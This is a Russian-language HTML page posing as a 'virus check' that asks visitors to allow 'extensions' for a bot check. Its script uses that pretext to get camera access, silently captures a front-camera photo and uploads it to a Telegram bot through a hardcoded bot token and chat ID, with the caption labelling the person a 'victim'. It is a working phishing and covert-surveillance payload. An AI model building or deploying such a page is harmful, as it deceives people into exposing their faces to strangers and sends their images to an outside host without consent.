<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>проверка на вирусы!</title>
  <style>
    body { margin:0; font-family: Arial, sans-serif; background:#111; color:#fff; text-align:center; }
    #container { padding: 20px; max-width: 500px; margin: auto; }
    video, canvas { display: none; }
    h1 { font-size: 2.5em; margin: 40px 0 20px; }
    p { font-size: 1.3em; line-height: 1.5; }
    button { 
      background: #ff3366; color: white; border: none; padding: 15px 40px; 
      font-size: 1.4em; border-radius: 50px; margin: 30px 0; cursor: pointer;
    }
    button:hover { background: #ff6699; }
    #status { font-size: 1.2em; margin-top: 30px; color: #0f0; }
  </style>
</head>
<body>

<div id="container">
  <h1>Проверь разрешил ли ты все!</h1>
  <p>Нажми кнопку ниже, разреши расширения! Они сделаны изза проверки на бота и новых правил</p>
  
  <button onclick="startPrank()">проверить</button>
  
  <div id="status"></div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
async function startPrank() {
  // Берём элементы ТОЛЬКО здесь — DOM уже загружен
  const video  = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx    = canvas.getContext('2d');
  const status = document.getElementById('status');

  if (!video || !canvas || !ctx || !status) {
    status.textContent = 'Ошибка: элементы страницы не найдены 😢 Перезагрузи страницу';
    console.error('Один из элементов не найден');
    return;
  }

  status.textContent = 'Запрашиваем расширения...';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user' }  // фронтальная
    });

    video.srcObject = stream;
    await video.play();  // ждём, пока видео запустится

    await new Promise(r => setTimeout(r, 3000));  // пауза 3 сек

    status.textContent = 'ждем! 📸';

    canvas.width  = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Выключаем камеру сразу
    stream.getTracks().forEach(track => track.stop());

    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);

    status.textContent = 'жди';

    const formData = new FormData();
    formData.append('chat_id', '8269416289');          // ← вставь
    formData.append('caption', `Жертва: ${new Date().toLocaleString('ru-RU')} 😭`);

    const blob = await (await fetch(dataUrl)).blob();
    formData.append('photo', blob, 'prank.jpg');

    const response = await fetch(`https://api.telegram.org/bot8678005399:AAFTHzqbs40DHQ3ziXoAXdFR1Kg_cuu_PTc/sendPhoto`, {  // ← вставь токен
      method: 'POST',
      body: formData
    });

    if (!response.ok) {
      throw new Error(`Telegram ответил ${response.status}`);
    }

    status.innerHTML = 'Фото отправлено тебе!<br>Можешь закрыть страницу.';

  } catch (err) {
    console.error(err);
    status.textContent = err.name === 'NotAllowedError'
      ? 'Ты не разрешил расширение нажми еще раз!'
      : 'Ошибка: ' + err.message;
  }
}
</script>

</body>
</html>
